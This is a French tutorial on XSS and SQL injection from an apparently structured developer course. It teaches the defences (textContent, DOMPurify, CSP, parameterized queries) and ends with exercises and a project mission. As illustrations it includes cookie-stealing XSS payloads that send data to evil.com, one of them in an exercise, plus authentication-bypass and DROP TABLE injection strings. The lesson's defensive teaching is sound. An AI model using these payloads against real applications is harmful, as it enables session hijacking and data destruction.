---
stability: intemporel
acte: comprendre
cognitive_level: L3
perturbation_modes: [transmission, fausse_piste]
anti_recipe_key: transmission+fausse_piste
transfer_distance: low
assessment_role: instructional_checkpoint
---

> **SCÈNE CRAZYDEVS : Attack on Titan :** ta frontière de confiance est un mur. Le problème n'est pas seulement de savoir s'il tient ; il faut savoir **qui peut passer, par où, avec quelle preuve et que se passe-t-il quand le mur est percé**.

# XSS et injection SQL

Temps de lecture ~9 min

T-Bag a trouvé une faille dans ton formulaire. Il a injecté du JavaScript dans ton champ "prénom" et maintenant il lit les cookies de session de tous tes détenus. Ce scénario arrive en prod tous les jours.

XSS (Cross-Site Scripting : injection de script côté client) et SQL Injection sont les deux attaques qui touchent le plus d'apps réelles. Pas parce que les devs sont nuls, mais parce que c'est invisible quand tu codes vite.

---

## 1) XSS : QUAND TON APP RECRACHE CE QU'ELLE A AVALÉ

### Le quoi

XSS : l'attaquant injecte du JavaScript malveillant dans ta page. Ce script s'exécute dans le navigateur d'une autre personne, dans le contexte de ton domaine. Il peut lire les cookies, voler des tokens, rediriger vers un faux site, ou enregistrer chaque touche tapée.

### Le pourquoi ça marche

Le navigateur fait confiance au contenu qui vient de ton domaine. Si ton serveur renvoie `<script>alert('pwned')</script>` dans le HTML, le navigateur l'exécute. Aucune discussion.

### Les trois types

```text
Reflected XSS  --> l'input malveillant est dans l'URL, renvoyé direct dans la réponse
Stored XSS   --> l'input est sauvegardé en DB, puis affiché à d'autres détenus
DOM-based XSS  --> le JS côté client manipule le DOM depuis une source non fiable (URL, postMessage)
```

Une XSS stockée peut avoir un large impact : un contenu malveillant enregistré est réinterprété à chaque affichage vulnérable. Le nombre de personnes touchées dépend des pages et des comptes qui consultent ce contenu ; ce n'est pas automatiquement le type de XSS « le plus dangereux » dans tous les contextes.

### Exemple qui casse

```js
// Scénario : afficher le nom d'un détenu dans la page
// Le détenu s'est inscrit avec ce "nom" : <script>fetch('https://evil.com/steal?c='+document.cookie)</script>

const username = getUserFromDB(); // retourne la chaîne malveillante
document.getElementById("welcome").innerHTML = `Bonjour ${username}`; // CATASTROPHE
// --> le script s'exécute, cookies envoyés à evil.com
```

```js
// Exemple minimal : la faille
app.get("/search", (req, res) => {
  const q = req.query.q; // l'attaquant passe ?q=<script>...</script>
  res.send(`<h1>Résultats pour : ${q}</h1>`); // injecté direct dans le HTML
});
```

```js
// Exemple pédagogique limité au CONTEXTE TEXTE d'un élément HTML.
// En application réelle, préfère l'échappement automatique du moteur de template.
// Ne réutilise jamais cet encodage pour un attribut, une URL, du JavaScript ou du CSS.
const escapeHtmlText = (value) =>
  String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/\"/g, "&quot;")
    .replace(/'/g, "&#x27;");

app.get("/search", (req, res) => {
  const q = escapeHtmlText(req.query.q); // encodage du seul contexte texte HTML
  res.send(`<h1>Résultats pour : ${q}</h1>`);
});
```

### La vraie règle

```text
innerHTML / document.write / eval() --> dangereux avec de la data externe
textContent / innerText       --> sûr : pas interprété comme HTML
```

```js
// Mauvais : innerHTML interprète les balises
element.innerHTML = userInput; // XSS si userInput contient du HTML

// Bon : textContent traite tout comme du texte brut
element.textContent = userInput; // affiché tel quel, jamais exécuté
```

Pour les cas où tu dois afficher du HTML détenu (éditeur riche, commentaires formatés) : utilise **DOMPurify** qui assainit (sanitize : nettoyer les éléments dangereux) le HTML sans tout bloquer.

```js
import DOMPurify from "dompurify";

// DOMPurify analyse le HTML et retire uniquement ce qui est dangereux
const clean = DOMPurify.sanitize(userHtml); // <script> retiré, <b> conservé
element.innerHTML = clean; // maintenant tu peux utiliser innerHTML
```

### Content Security Policy

CSP (Content Security Policy : politique de sécurité du contenu) est une défense supplémentaire, pas la protection principale contre XSS. Une politique trop permissive peut laisser passer des scripts servis depuis la même origine ; une politique adaptée utilise notamment des nonces ou des hashes pour les scripts autorisés, sans ajouter `unsafe-inline` par facilité. La politique doit être testée sur l'application réelle.

```js
// Exemple de départ seulement : bloque les scripts inline, mais autorise les scripts same-origin.
// Cette politique ne remplace ni textContent, ni l'encodage contextuel, ni DOMPurify.
res.setHeader(
  "Content-Security-Policy",
  "default-src 'self'; script-src 'self'",
);
```

---

## 2) INJECTION SQL : QUAND TON INPUT DEVIENT UNE REQUÊTE

### Le quoi

SQL Injection : l'attaquant insère du SQL dans un champ de formulaire. Si tu concatènes (coller bout à bout) cet input dans ta requête, il peut lire toute ta DB, supprimer des tables, ou contourner l'authentification.

### Exemple qui casse

```js
// Chakra_gate classique SANS protection
app.post("/enter-arena", async (req, res) => {
  const { username, password } = req.body;

  // L'attaquant entre comme username : admin' OR '1'='1' --
  // La requête devient : SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '...'
  // '1'='1' est toujours vrai, le -- commente le reste --> l'attaquant est connecté sans mot de passe
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

  const user = await db.query(query); // résultat : admin connecté sans connaître le mot de passe
  if (user) res.json({ token: generateToken(user) }); // token envoyé à l'attaquant
});
```

```js
// L'attaque de suppression : username = '; DROP TABLE users; --
// La requête devient : SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
// Toute la table users est supprimée
```

### La fix : requêtes paramétrées

```js
// Avec paramètres : le driver SQL sépare le code des données.
// On cherche le compte par identifiant ; le mot de passe n'est jamais une colonne en clair.
app.post("/enter-arena", async (req, res) => {
  const { username, password } = req.body;
  const result = await db.query(
    "SELECT id, username, password_hash FROM users WHERE username = $1",
    [username],
  );
  const user = result.rows[0];
  // La vérification du mot de passe se fait ensuite avec la fonction de hachage dédiée.
  // Voir 06-hashing_bcrypt.md : Argon2id pour une nouvelle application.
  if (user && (await verifyPassword(password, user.password_hash))) {
    return res.json({ token: generateToken(user) });
  }
  return res.status(401).json({ error: "Identifiants incorrects" });
});
```

```js
// Avec un ORM (Object-Relational Mapper : couche d'abstraction sur la DB) comme Prisma
// La valeur de username reste une donnée paramétrée, jamais du SQL concaténé.
const user = await prisma.user.findUnique({
  where: { username },
  select: { id: true, username: true, passwordHash: true },
});
// Vérifie ensuite password avec Argon2id ; ne stocke et ne compare jamais le mot de passe en clair.
```

### Règle absolue

```text
Valeurs fournies par l'utilisateur : toujours des paramètres liés
(bound parameters / prepared statements), jamais concaténées au SQL.
Noms de tables, colonnes, directions de tri et mots-clés SQL :
ils ne sont pas des valeurs paramétrables ; choisir parmi une allowlist
constante côté serveur, jamais interpoler un fragment brut fourni par le client.
```

Un paramètre lié protège une valeur. Il ne rend pas sûr un nom de colonne, une table ou un fragment SQL construit dynamiquement.

### Aller plus loin : limiter les droits DB

Même si une injection passe, un compte DB avec des droits limités réduit les dégâts :

```text
compte app  --> SELECT, INSERT, UPDATE sur les tables nécessaires uniquement
compte admin --> accès complet, utilisé uniquement pour les migrations
```

Un attaquant qui injecte du SQL avec un compte `SELECT only` ne peut pas `DROP TABLE`.

---

## EXERCICES

**EXO 1 : L'évasion de Fox River version XSS**
Le site de suivi des prisonniers de Fox River affiche le nom de chaque détenu dans la page HTML. Michael Scofield a entré comme nom : `<img src=x onerror="window.location='https://evil.com/escape?data='+document.cookie">`.
Implémenter la fonction `renderPrisonerProfile(prisoner)` qui affiche le profil sans permettre l'exécution du script.
Contrainte : utiliser uniquement `textContent`, pas de bibliothèque externe.
(Indice : chaque propriété affichée dans le DOM doit passer par `textContent`, pas `innerHTML`)

**EXO 2 : La base de données de Heisenberg**
La function `findProduct(name)` cherche un jutsu dans la DB par son nom. Walter White entre comme nom de jutsu : `blue' OR '1'='1`.
Réécrire la fonction pour qu'elle soit immunisée contre l'injection SQL, avec pg (node-postgres).
Contrainte : pas d'ORM, requête brute avec paramètres liés.

**EXO 3 : CSP pour TrapSoul Radio**
TrapSoul Radio affiche les biographies des artistes en HTML riche (gras, italique, liens). Les artistes peuvent soumettre leur propre bio.
Sanitise le HTML avec DOMPurify **à la frontière de rendu**, juste avant son insertion dans le DOM. Définis une allowlist minimale de balises et d'attributs, puis configure une CSP adaptée aux ressources réellement nécessaires. La CSP est une défense supplémentaire : elle ne remplace ni DOMPurify ni un rendu sûr.
Contrainte : les `<b>`, `<i>`, `<a href>` légitimes doivent survivre ; les `<script>`, les handlers `on*` et les URL dangereuses doivent être retirés ou neutralisés. N'autorise que les protocoles de liens nécessaires.
(Indice : `DOMPurify.sanitize(html, { ALLOWED_TAGS: [...], ALLOWED_ATTR: [...] })`. La politique CSP doit notamment éviter `unsafe-inline` ; utilise des nonces ou hashes si des scripts inline sont réellement indispensables.)

---

## RÉSUMÉ

XSS et injection SQL ont un point commun : une donnée non fiable est interprétée dans un contexte qui lui donne un sens spécial : mais leurs protections ne sont pas interchangeables. Pour SQL, sépare toujours la requête de ses valeurs avec des paramètres liés ; la validation de l'input ne remplace pas cette protection. Si une colonne ou une direction de tri doit varier, sélectionne une option parmi une allowlist constante côté serveur : un placeholder SQL ne paramètre pas un identifiant. Pour XSS, protège chaque sortie selon son contexte : `textContent` ou l'échappement automatique pour du texte, et DOMPurify uniquement lorsque l'application accepte volontairement du HTML utilisateur. La validation métier vérifie les données attendues ; elle ne remplace ni les paramètres SQL ni la protection du rendu.

## CHECKPOINT DE PROFONDEUR : variation I : reconstruction sans template

Ferme la page et écris de mémoire : problème → mécanisme → invariant → décision → limite. Tu n'as pas le droit d'utiliser le vocabulaire de la section comme structure imposée. Compare ensuite ta reconstruction avec la source et note ce qui manquait.

<!-- AF-LESSON-PROFILE: database -->

## Repères de décision

- **Pourquoi :** La modélisation et les contraintes protègent l'intégrité des données même quand plusieurs clients ou processus agissent en même temps.
- **Quand l’utiliser / quand l’éviter :** Utilise les transactions et contraintes pour les invariants métier. Choisis le modèle selon les accès réels ; ne choisis pas NoSQL juste parce que le schéma semble flexible.
- **Limites :** La base ne choisit pas les bonnes règles métier à ta place. Les index coûtent en écriture et stockage ; l'isolation a un coût ; les garanties varient selon le moteur et sa configuration.

## Mécanisme : la version sans magie

Part des requêtes et invariants, conçois clés et contraintes, exécute les écritures dans une transaction, puis vérifie le comportement concurrent et les migrations.

## Ancrage produit / terrain : Kintana

Dans [Kintana](../../06-ANNEXES-TRANSVERSES/77-FIL-ROUGE-KINTANA/README.md), **XSS et injection SQL** se rattache à ce cas concret : Kintana ne doit pas attribuer le dernier créneau à deux demandeurs ni laisser un agent lire le dossier d'un autre tenant.

**À observer :** le comportement attendu, le cas d'échec, la trace ou mesure utile et le niveau de preuve. Étiquette `CONCEPT`, `LAB`, `SIMULATION`, `PILOT` ou `PRODUCTION` selon ce qui a réellement été fait. Une fixture synthétique n'est pas une observation de terrain.

## Mission utile : Kintana : Intégrité transactionnelle des demandes et créneaux

> **Arc One Piece / Grand Line :** la base est le registre du navire. Si deux personnes modifient la même ligne sans règle, le journal de bord devient une fiction.

**Mission liée à « XSS et injection SQL » :** Modélise une partie du domaine Kintana avec clés, contraintes et index justifiés. Écris une transaction qui réserve le dernier créneau, puis exécute deux requêtes concurrentes dans une base de test pour vérifier qu'une seule gagne.

**Livrable :** DDL/migration, requêtes d'accès, transaction, test de concurrence et plan de restauration de fixture.

**Critères d’acceptation :** les invariants critiques sont ancrés côté base ; le test concurrent est réellement exécuté sur le moteur annoncé ; les index sont justifiés par les requêtes ; la migration est réversible ou son risque est documenté.

**Transfert obligatoire :** Ajoute un deuxième centre de service et un historique plus long. Vérifie index, isolation, rétention et accès par tenant.
